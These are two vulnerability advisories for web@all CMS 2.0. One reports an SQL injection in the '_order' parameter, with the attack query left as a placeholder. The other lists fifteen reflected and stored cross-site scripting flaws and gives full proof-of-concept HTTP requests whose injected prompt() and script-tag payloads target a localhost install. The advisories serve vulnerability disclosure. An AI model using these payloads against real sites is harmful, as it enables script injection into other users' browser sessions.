@@ -1,0 +1,197 @@
+web@all CMS 2.0 (_order) SQL Injection Vulnerability
+
+
+Vendor: web@all
+Product web page: http://www.webatall.org
+Affected version: 2.0
+
+Summary: web@all is a PHP content management system (CMS). If you
+know about it,you nearly can use it to do anything.
+
+Desc: The application suffers from an SQL Injection vulnerability.
+Input passed via the GET parameter '_order' is not properly sanitised
+before being returned to the user or used in SQL queries. This can be
+exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5099
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5099.php
+
+
+21.08.2012
+
+---
+
+
+http://localhost/webatall/sys/index.php?_key=author&_order=1[SQL ATTACK QUERY]&_text[status]=-1&_type[]=0&mod=article
+
+=============================================================================
+
+web@all CMS 2.0 Multiple Remote XSS Vulnerabilities
+
+
+Vendor: web@all
+Product web page: http://www.webatall.org
+Affected version: 2.0
+
+Summary: web@all is a PHP content management system (CMS). If you
+know about it,you nearly can use it to do anything.
+
+Desc: web@all CMS suffers from multiple stored and reflected cross-site
+scripting vulnerabilities. The issues are triggered when input passed via
+several parameters to several scripts is not properly sanitized before being
+returned to the user. This can be exploited to execute arbitrary HTML and
+script code in a user's browser session in context of an affected site.
+
+----------------------------------------------------------------------------
+  * Parameter *          * Method *          * Module *          * Type *
+----------------------------------------------------------------------------
+
+ 1. act                    POST                member            Reflected
+ 2. security               POST                member            Reflected
+ 3. username               POST                member            Reflected
+ 4. id                     GET                 article           Reflected
+ 5. mod                    GET/POST            member            Reflected
+ 6. _flag                  GET                 article           Reflected
+ 7. _text[]                GET                 article           Reflected
+ 8. _text[alias]           GET                 article           Reflected
+ 9. _text[category]        GET                 article           Reflected
+10. _text[email]           GET                 member            Reflected
+11. _text[title]           GET                 article           Reflected
+12. _text[username]        GET                 article           Reflected
+13. _text[timeadd]         GET                 member            Reflected
+14. title                  POST                article/cron      Stored
+15. description            POST                cron              Stored
+
+----------------------------------------------------------------------------
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5098
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5098.php
+
+
+21.08.2012
+
+---
+
+
+Reflected:
+----------
+
+
+POST /webatall/sys/action.php HTTP/1.1
+Content-Length: 154
+Content-Type: application/x-www-form-urlencoded
+Cookie: guest=A0; __WA:auth=1; auth=2834d02f4b8925b021232f297a57a5a743894a0e4a801fc31
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+act=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28900164%29%29%3e&goto=%2fsys&mod=member&password=Password&security=1&submit=Sign%20in&username=Username
+
+
+POST /webatall/sys/action.php HTTP/1.1
+Content-Length: 154
+Content-Type: application/x-www-form-urlencoded
+Cookie: guest=A0; __WA:auth=1; auth=2834d02f4b8925b021232f297a57a5a743894a0e4a801fc31
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+act=signin&goto=%2fsys&mod=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28920000%29%29%3e&password=Password&security=1&submit=Sign%20in&username=Username
+
+
+POST /webatall/sys/action.php HTTP/1.1
+Content-Length: 159
+Content-Type: application/x-www-form-urlencoded
+Cookie: guest=A0; __WA:auth=1; auth=2834d02f4b8925b021232f297a57a5a743894a0e4a801fc31
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+act=signin&goto=%2fsys&mod=member&password=Password&security=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28964492%29%29%3e&submit=Sign%20in&username=Username
+
+
+POST /webatall/sys/action.php HTTP/1.1
+Content-Length: 147
+Content-Type: application/x-www-form-urlencoded
+Cookie: guest=A0; __WA:auth=1; auth=2834d02f4b8925b021232f297a57a5a743894a0e4a801fc31
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+act=signin&goto=%2fsys&mod=member&password=admin&security=1&submit=Sign+in&username=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28913398%29%29%3e
+
+
+GET /webatall/sys/index.php?_flag=&_key=title&_order=&_text%5b%5d=&_text%5bcategory%5d=&_text%5bstatus%5d=-1&_type%5b%5d=0&id=%22%20onmouseover%3dprompt%28940245%29%20bad%3d%22&mod=article
+GET /webatall/sys/index.php?_text[timeadd]=1345564800&_type[timeadd]=2&mod=1%3cdiv%20style%3dwidth%3aexpression%28prompt%28961358%29%29%3e
+GET /webatall/sys/index.php?_flag=%22%20onmouseover%3dprompt%28916116%29%20bad%3d%22&_key=title&_order=&_text%5b%5d=&_text%5bcategory%5d=&_text%5bstatus%5d=-1&_type%5b%5d=0&id=&mod=article
+GET /webatall/sys/index.php?_flag=&_key=title&_order=&_text%5b%5d=%22%20onmouseover%3dprompt%28965775%29%20bad%3d%22&_text%5bcategory%5d=&_text%5bstatus%5d=-1&_type%5b%5d=0&id=&mod=article
+GET /webatall/sys/index.php?_text%5balias%5d=%22%20onmouseover%3dprompt%28989568%29%20bad%3d%22&_type%5balias%5d=0&mod=article
+GET /webatall/sys/index.php?_flag=&_key=title&_order=&_text%5b%5d=&_text%5bcategory%5d=%22%20onmouseover%3dprompt%28926119%29%20bad%3d%22&_text%5bstatus%5d=-1&_type%5b%5d=0&id=&mod=article
+GET /webatall/sys/index.php?_text%5bemail%5d=%22%20onmouseover%3dprompt%28999602%29%20bad%3d%22&_type%5bemail%5d=0&mod=member
+GET /webatall/sys/index.php?_text%5btitle%5d=%22%20onmouseover%3dprompt%28927731%29%20bad%3d%22&_type%5btitle%5d=0&mod=article
+GET /webatall/sys/index.php?_text%5busername%5d=%22%20onmouseover%3dprompt%28926119%29%20bad%3d%22&_type%5busername%5d=0&mod=member
+GET /webatall/sys/index.php?_text[timeadd]=%22%20onmouseover%3dprompt%28929079%29%20bad%3d%22&_type[timeadd]=2&mod=member
+
+
+
+Stored:
+-------
+
+
+POST http://localhost/webatall/sys/action.php HTTP/1.1
+
+act	sys_add
+author	test
+category_id	1
+content	test
+content_key	test
+copyright	test
+files	
+id	
+lang	
+menu	
+meta_description	test
+meta_keywords	test
+mod	article
+options	test
+status	1
+thumbs	test
+title	"><script>alert(1);</script>
+
+
+
+POST http://localhost/webatall/sys/action.php HTTP/1.1
+
+act	sys_add
+cron	delete_unpaid_transaction.php
+description	"><script>alert(2);</script>
+id	
+menu	
+mod	cron
+run_interval	
+status	1
+title	"><script>alert(3);</script>
